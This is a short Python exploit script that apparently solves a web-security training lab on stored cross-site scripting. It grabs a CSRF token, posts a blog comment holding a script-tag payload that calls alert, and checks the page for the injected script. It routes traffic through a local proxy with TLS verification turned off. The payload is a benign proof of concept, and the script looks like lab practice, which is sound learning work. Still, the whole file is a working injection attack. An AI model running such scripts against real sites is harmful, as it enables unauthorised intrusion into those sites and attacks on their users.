import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies  = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find('input', {'name' : 'csrf'})['value']
    return csrf_token



def xss_attack(s, url):
    # POST URL
    post_url = url + '/post?postId=5'

    # POST COMMENT URL
    comment_url = url + '/post/comment'

    # STORE PAYLOAD AND SEND REQUEST
    params = {
        'csrf' : get_csrf(s, post_url),
        'postId' : 5,
        'comment': "<p><script>alert('XSS Vuln')</script></p>",
        'name' : 'test',
        'email' : 'test@test.test',
        'website' : 'http://test'
    }
    r = s.post(comment_url, data=params, verify=False, proxies=proxies)

    # CHECK EXPLOITATION
    r = s.get(post_url, verify=False, proxies=proxies)
    if "<p><script>alert('XSS Vuln')</script></p>" not in r.text:
        print("[-] Eploit failed!")
        sys.exit(-1)
    print("[+] Exploit worked!")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].strip()

    print("[+] Lab: Stored XSS into HTML context with nothing encoded")
    print("""[+] This lab contains a stored cross-site scripting vulnerability in the comment functionality.
    To solve this lab, submit a comment that calls the alert function when the blog post is viewed.""")

    xss_attack(s, url)

if __name__ == "__main__":
    main()